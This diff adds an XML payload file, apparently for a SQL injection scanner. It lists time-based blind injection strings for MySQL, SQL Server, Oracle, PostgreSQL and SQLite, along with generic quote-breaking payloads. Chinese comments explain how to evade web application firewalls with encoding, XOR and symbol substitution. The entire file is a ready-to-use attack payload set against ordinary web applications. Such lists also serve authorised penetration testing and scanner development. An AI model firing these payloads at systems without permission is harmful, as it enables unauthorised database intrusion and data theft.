@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- Test -->
+    <dbms value="Test">
+        <payload value="'%22`"/>
+    </dbms>
+
+    <!-- MySQL -->
+    <dbms value="MySQL">
+        <payload value=".0=SLEEP({TIMEOUT}.0)"/>
+        <!-- sleep是最先执行的语句，or sleep = sleep都不行，暂不知道啥原因 -->
+        <payload value=".0=(SELECT%201%20FROM%20(SELECT(sleep({TIMEOUT})))Gbqj)"/>
+        <!--waf-->
+        <!--'=SLEEP({TIMEOUT}.0)='-->
+        <payload value="'=SLEEP({TIMEOUT}.0)='"/>
+        <!--'=sleep({TIMEOUT})='等号可能是失效，使用加号却可以-->
+        <payload value="'%2bSLEEP({TIMEOUT}.0)%2b'"/>
+        <!--XOR是考虑1、fase and sleep() 2、XOR这里只能是字母，而非符号。 不适用xor是避免关键词-->
+        <payload value="'XOR(SLEEP({TIMEOUT}.0))XOR'"/>
+        <!--面对表为空，或者false and sleep({TIMEOUT})这种情形-->
+        <!--<payload value="'=(SELECT%201%20FROM%20(SELECT(sleep({TIMEOUT})))Gbqj)='"/>-->
+        <payload value=".0=(select(0)from(select(sleep({TIMEOUT})))v)/*'=(select(0)from(select(sleep({TIMEOUT})))v)='%22=(select(0)from(select(sleep({TIMEOUT})))v)=%22*/"/>
+        <payload value=".0=BENCHMARK(22000000,MD5(1))/*'=BENCHMARK(22000000,MD5(1))='%22=BENCHMARK(22000000,MD5(1))=%22*/"/>
+    </dbms>
+
+
+    <!-- Microsoft SQL Server -->
+    <dbms value="SQLServer">
+        <!--修改select count(*)为select '1'，是因为字符串拼接，而count是数组，导致报错-->
+        <payload value="%2b(SELECT%20'1'%20FROM%20sysusers%20AS%20sys1,sysusers%20AS%20sys2,sysusers%20AS%20sys3,sysusers%20AS%20sys4,sysusers%20AS%20sys5,sysusers%20AS%20sys6,sysusers%20AS%20sys7,sysusers%20AS%20sys8)"/>
+        <!--waf-->
+        <!--'%2b(SELECT%0a&#45;&#45;%0aCOUNT(*)%0a&#45;&#45;%0aFROM%20sysusers%20AS%20sys1,sysusers%20AS%20sys2,sysusers%20AS%20sys3,sysusers%20AS%20sys4,sysusers%20AS%20sys5,sysusers%20AS%20sys6,sysusers%20AS%20sys7,sysusers%20AS%20sys8)%2b'-->
+        <!--header不会url解码-->
+        <!--<payload value="'%20(SELECT%20COUNT(*)%20FROM%20sysusers%20AS%20sys1,sysusers%20AS%20sys2,sysusers%20AS%20sys3,sysusers%20AS%20sys4,sysusers%20AS%20sys5,sysusers%20AS%20sys6,sysusers%20AS%20sys7,sysusers%20AS%20sys8)%20'"/>-->
+        <payload value="'%2b(SELECT%20'1'%20FROM%20sysusers%20AS%20sys1,sysusers%20AS%20sys2,sysusers%20AS%20sys3,sysusers%20AS%20sys4,sysusers%20AS%20sys5,sysusers%20AS%20sys6,sysusers%20AS%20sys7,sysusers%20AS%20sys8)%2b'"/>
+        <!--waf-->
+        <!--<payload value="'%20WHILE%201=1%20PRINT%201&#45;&#45;&#45;&#45;"/>-->
+        <payload value="'%20WHILE%201=1%20CONTINUE---s"/>
+        <!-- and 1=2 waitfor delay '0:0:{TIMEOUT}'是不会延迟的 '%20or%201=1%20waitfor%20delay%20'0:0:{TIMEOUT}'%20注释s -->
+        <payload value="'%20waitfor%20delay%20'0:0:{TIMEOUT}'%20--s"/>
+        <payload value="%20waitfor%20delay%20'0:0:{TIMEOUT}'%20--s"/>
+        <payload value=")%20waitfor%20delay%20'0:0:{TIMEOUT}'%20--s"/>
+        <payload value="')%20waitfor%20delay%20'0:0:{TIMEOUT}'%20--s"/>
+        <payload value="'))%20waitfor%20delay%20'0:0:{TIMEOUT}'%20--s"/>
+    </dbms>
+
+
+    <!-- Oracle -->
+    <dbms value="Oracle">
+        <payload value="%20or%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),{TIMEOUT})"/>
+        <payload value="||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),{TIMEOUT})"/>
+        <payload value="'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),{TIMEOUT})||'"/>
+        <!--后面使用or '1'='2,数据库可能优化or '1'='1'-->
+        <payload value="'%20OR%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),{TIMEOUT})%20OR%20'1'='2"/>
+        <payload value="'%20OR%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),{TIMEOUT})%20OR'"/>
+        <payload value="||(SELECT%20COUNT(*)%20FROM%20ALL_USERS%20T1,ALL_USERS%20T2,ALL_USERS%20T4,ALL_USERS%20T4,ALL_USERS%20T5,ALL_USERS%20T6)"/>
+        <payload value="%27||(SELECT%20COUNT(*)%20FROM%20ALL_USERS%20T1,ALL_USERS%20T2,ALL_USERS%20T4,ALL_USERS%20T4,ALL_USERS%20T5,ALL_USERS%20T6)||%27"/>
+    </dbms>
+
+    <!--PostgreSQL-->
+    <dbms value="PostgreSQL">
+        <payload value=".0-(select%201%20from%20PG_SLEEP({TIMEOUT}.0))"/>
+        <payload value="'||(PG_SLEEP({TIMEOUT}.0))||'"/>
+    </dbms>
+
+
+    <!-- SQLite -->
+    <dbms value="SQLite">
+        <payload value=".0||LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({TIMEOUT}00000000/2))))"/>
+        <payload value="'||LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({TIMEOUT}00000000/2))))||'"/>
+    </dbms>
+
+    <!-- All -->
+    <dbms value="All">
+        <payload value="*1"/>
+        <payload value="%20--%20s"/>
+        <!--payload后面改成不等于，%20or%20%27%26%27!=%27 -->
+        <!--or后面加注释，是因为 and 1=1 or 1=1 and 1=2， 由于双输入点，使用要注释 and 1=2 , payload 为 %20or%20%27%26%27=%27%26%27 注释  -->
+        <payload value="%20or%20%27%26%27=%27%26"/>
+        <payload value="'%20'"/>
+        <payload value="'||'"/>
+        <payload value="'%2b'"/>
+        <payload value="'%20--%20s"/>
+        <payload value="%22%20--%20s"/>
+        <!--使用符号绕waf，' or '&'='&-->
+        <payload value="'%20or%20%27%26%27=%27%26"/>
+        <!--注入在by `id`,SELECT * FROM module_softwares WHERE `Enable`='1' ORDER BY `uid`` DESC LIMIT 0,20-->
+        <payload value="`%20--%20\"/>
+    </dbms>
+</root>
